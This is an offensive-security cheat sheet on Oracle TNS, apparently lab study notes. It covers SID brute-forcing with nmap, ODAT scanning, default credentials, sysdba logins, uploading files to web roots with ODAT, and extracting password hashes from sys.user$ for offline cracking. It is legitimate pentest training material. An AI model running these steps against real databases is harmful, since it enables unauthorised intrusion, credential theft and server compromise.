---

# 🛰️ Oracle TNS Cheat Sheet

---

> [!info] 🧠 What is Oracle TNS?
>
> ```bash
> Communications protocol for Oracle Databases and applications
> ```
>
> 💡 Key Functions:
>
> * **Name Resolution**: Maps service names to network addresses.
> * **Connection Management**: Establishes and maintains database sessions.
> * **Security**: Provides built-in encryption (SSL/TLS) for data in transit.
>
> ✔ Common in:
>
> * Enterprise Finance, Healthcare, and Retail environments.

---

> [!tip] 🔧 Core Idea
>
> ```bash
> Client (tnsnames.ora) ↔ Listener (listener.ora) ↔ Database Instance (SID)
> ```
> 
>
> 💡 Key Port:
>
> * **TCP 1521** → Default Oracle TNS Listener port.
>
> ✔ Think of it as **the switchboard operator for Oracle databases**.

---

# 🌳 Structure: Configuration Files

---

### 📄 tnsnames.ora (Client-Side)
Defines how the client finds the database.
```text
ORCL = (DESCRIPTION = 
  (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
  (CONNECT_DATA = (SERVICE_NAME = orcl))
)
```

### 📄 listener.ora (Server-Side)
Defines how the server listens for requests.
```text
LISTENER = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))
SID_LIST_LISTENER = (SID_LIST = (SID_DESC = (SID_NAME = XE)))
```

---

# 🔍 Footprinting & Enumeration

---

> [!success] 📡 Key Enumeration Tools
>
> ```bash
> # 1. Version Scan
> nmap -p 1521 -sV <target>
> 
> # 2. SID Bruteforcing (System ID)
> nmap -p 1521 --script oracle-sid-brute <target>
> 
> # 3. Comprehensive Scanning (ODAT)
> ./odat.py all -s <target>
> ```
>
> 💡 **SID (System Identifier)**: A unique name for the database instance. You MUST have the SID to connect. Common default: `XE`, `ORCL`.

---

# 🔐 Authentication & Access

---

> [!info] 🔑 Credentials
>
> * **Default Passwords**: `scott / tiger`, `sys / change_on_install`, `dbsnmp / dbsnmp`.
> * **Login via SQL*Plus**:
>   ```bash
>   sqlplus user/pass@IP/SID
>   # Log in as System Admin (highest privs)
>   sqlplus user/pass@IP/SID as sysdba
>   ```

---

# ⚠️ Common Exploitation Paths

---

> [!danger] 📂 File Upload (via ODAT)
> If you have `sysdba` or high-level permissions, you can write files to the OS.
>
> ```bash
> ./odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba --putFile <Remote_Path> <Local_File>
> ```
> 💡 Common Web Roots:
> * Linux: `/var/www/html`
> * Windows: `C:\inetpub\wwwroot`

---

> [!warning] 🔓 Password Hashing
> Extract hashes from the `sys.user$` table for offline cracking:
> ```sql
> SELECT name, password FROM sys.user$;
> ```

---

# ⚡ Real-World Workflow

---

> [!success] 🧠 Attack Flow
>
> ```bash
> 1. Port scan TCP 1521
> 2. Bruteforce/Guess the SID (XE/ORCL)
> 3. Bruteforce credentials (scott/tiger)
> 4. Check for 'as sysdba' permissions
> 5. Enumerate tables or attempt OS file interaction
> ```
>
> 💡 Oracle TNS is often overlooked but can lead directly to full OS compromise via DB permissions.

---

# 🧩 Mental Model

---

> [!quote] 🎯 The Oracle Handshake
>
> 
```bash
> Listener → The Receptionist
> SID → The Room Number
> tnsnames.ora → The Phonebook
> listener.ora → The Office Directory
> ```
>
> 💡 You can't talk to the **Database** without getting past the **Receptionist** (Listener) with a valid **Room Number** (SID).
```